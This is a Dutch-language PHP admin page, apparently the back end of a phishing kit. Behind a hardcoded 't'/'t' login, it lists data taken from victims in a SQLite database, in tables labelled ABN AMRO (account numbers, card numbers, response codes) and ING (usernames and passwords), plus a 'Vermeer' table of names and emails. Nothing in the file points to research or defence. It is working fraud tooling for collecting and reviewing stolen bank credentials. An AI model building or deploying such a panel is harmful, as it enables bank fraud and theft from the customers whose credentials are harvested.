<?php
// === Logincontrole === //
$correct_username = "t";
$correct_password = "t";

if (!isset($_POST['username']) || !isset($_POST['password']) ||
    $_POST['username'] !== $correct_username || $_POST['password'] !== $correct_password) {
    echo '<!DOCTYPE html>
    <html lang="nl">
    <head><meta charset="UTF-8"><title>Inloggen</title></head>
    <body>
      <h2>Inloggen vereist</h2>
      <form method="POST">
        <input type="text" name="username" placeholder="Gebruikersnaam" required><br><br>
        <input type="password" name="password" placeholder="Wachtwoord" required><br><br>
        <button type="submit">Inloggen</button>
      </form>
    </body>
    </html>';
    exit;
}

// === Database uitlezen === //
$db = new PDO('sqlite:' . __DIR__ . '/data.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// ABN AMRO
$db->exec("CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rekeningnummer TEXT,
    pasnummer TEXT,
    respons TEXT,
    respons2 TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$stmt = $db->query("SELECT * FROM logins ORDER BY created_at DESC");
$logins = $stmt->fetchAll(PDO::FETCH_ASSOC);

// ING
$db->exec("CREATE TABLE IF NOT EXISTS ing_logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$stmt2 = $db->query("SELECT * FROM ing_logins ORDER BY created_at DESC");
$ing_logins = $stmt2->fetchAll(PDO::FETCH_ASSOC);

// Vermeer
$db->exec("CREATE TABLE IF NOT EXISTS vermeer (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    naam TEXT,
    email TEXT,
    opmerking TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$stmt3 = $db->query("SELECT * FROM vermeer ORDER BY created_at DESC");
$vermeer_logins = $stmt3->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Gegevens Overzicht</title>
  <style>
    table { 
      border-collapse: collapse; 
      width: 100%; 
      margin-bottom: 40px;
      table-layout: fixed;
    }
    th, td { 
      border: 1px solid #ccc; 
      padding: 8px; 
      text-align: left; 
      white-space: normal;
      overflow-wrap: break-word;
    }
    h1, h2 { 
      font-family: Arial, sans-serif; 
    }
  </style>
</head>
<body>
  <h1>ABN AMRO</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Rekeningnummer</th>
        <th>Pasnummer</th>
        <th>Respons</th>
        <th>Respons 2</th>
        <th>Aanmaakdatum</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach($logins as $login): ?>
      <tr>
        <td><?= htmlspecialchars($login['id']) ?></td>
        <td><?= htmlspecialchars($login['rekeningnummer']) ?></td>
        <td><?= htmlspecialchars($login['pasnummer']) ?></td>
        <td><?= htmlspecialchars($login['respons']) ?></td>
        <td><?= htmlspecialchars($login['respons2']) ?></td>
        <td><?= htmlspecialchars($login['created_at']) ?></td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>

  <h1>ING</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Gebruikersnaam</th>
        <th>Wachtwoord</th>
        <th>Aanmaakdatum</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach($ing_logins as $ing): ?>
      <tr>
        <td><?= htmlspecialchars($ing['id']) ?></td>
        <td><?= htmlspecialchars($ing['username']) ?></td>
        <td><?= htmlspecialchars($ing['password']) ?></td>
        <td><?= htmlspecialchars($ing['created_at']) ?></td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>

  <h1>Vermeer</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Naam</th>
        <th>Email</th>
        <th>Opmerking</th>
        <th>Aanmaakdatum</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach($vermeer_logins as $v): ?>
      <tr>
        <td><?= htmlspecialchars($v['id']) ?></td>
        <td><?= htmlspecialchars($v['naam']) ?></td>
        <td><?= htmlspecialchars($v['email']) ?></td>
        <td><?= htmlspecialchars($v['opmerking']) ?></td>
        <td><?= htmlspecialchars($v['created_at']) ?></td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>
</body>
</html>
